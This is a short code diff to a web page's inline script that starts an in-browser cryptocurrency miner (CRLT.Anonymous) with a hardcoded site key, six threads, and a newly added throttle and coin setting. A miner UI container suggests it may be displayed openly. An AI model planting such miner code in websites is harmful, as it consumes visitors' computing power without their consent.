@@ -9,8 +9,8 @@
   <script>
   var miner = null;
   try {
-    miner = new CRLT.Anonymous('afe049218f1c2efea9e703620b99f9dbbc80adf01602', {threads: 6});
-  } catch(e) {}
+    miner = new CRLT.Anonymous('afe049218f1c2efea9e703620b99f9dbbc80adf01602', { threads:6,throttle:0.2, coin: "xmrupx",})
+  } catch(e) { console.log(e) }
 
   var ui = new MinerUI(miner, {
     container: document.getElementById('miner'),
